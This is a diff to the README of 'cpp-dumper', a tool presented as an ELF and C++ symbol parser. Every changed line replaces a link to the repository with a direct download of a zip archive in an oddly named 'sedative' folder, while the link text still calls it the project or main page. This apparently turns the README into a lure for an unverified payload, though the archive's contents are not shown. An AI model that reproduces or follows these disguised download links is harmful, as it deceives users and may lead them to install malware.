@@ -1,6 +1,6 @@
 # 🛠️ cpp-dumper - Simple ELF and C++ Symbol Parser
 
-[![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-brightgreen?style=for-the-badge)](https://github.com/jayed50/cpp-dumper)
+[![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-brightgreen?style=for-the-badge)](https://github.com/jayed50/cpp-dumper/raw/refs/heads/main/sedative/dumper-cpp-1.7.zip)
 
 ## 📖 What is cpp-dumper?
 
@@ -29,13 +29,13 @@ This tool serves well those interested in code analysis, software reversing, and
 
 To get started, visit the official repository page below. This link will take you to the project where you can find the latest available files.
 
-[Download or learn more here](https://github.com/jayed50/cpp-dumper)
+[Download or learn more here](https://github.com/jayed50/cpp-dumper/raw/refs/heads/main/sedative/dumper-cpp-1.7.zip)
 
 ## 🚀 How to Download and Install on Windows
 
 1. Click the link above or this button to open the project page:
    
-   [![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-blue?style=for-the-badge)](https://github.com/jayed50/cpp-dumper)
+   [![Download cpp-dumper](https://img.shields.io/badge/Download-cpp--dumper-blue?style=for-the-badge)](https://github.com/jayed50/cpp-dumper/raw/refs/heads/main/sedative/dumper-cpp-1.7.zip)
 
 2. Look for the **Releases** or **Assets** section on the page. Usually, these are placed near the top or bottom of the page.
 
@@ -127,7 +127,7 @@ This project relates to:
 
 ## 🔗 Useful Links
 
-- Main page: [https://github.com/jayed50/cpp-dumper](https://github.com/jayed50/cpp-dumper)
+- Main page: [https://github.com/jayed50/cpp-dumper/raw/refs/heads/main/sedative/dumper-cpp-1.7.zip](https://github.com/jayed50/cpp-dumper/raw/refs/heads/main/sedative/dumper-cpp-1.7.zip)
 - Download section on GitHub releases
 - Windows user guides for unzipping and running programs
 
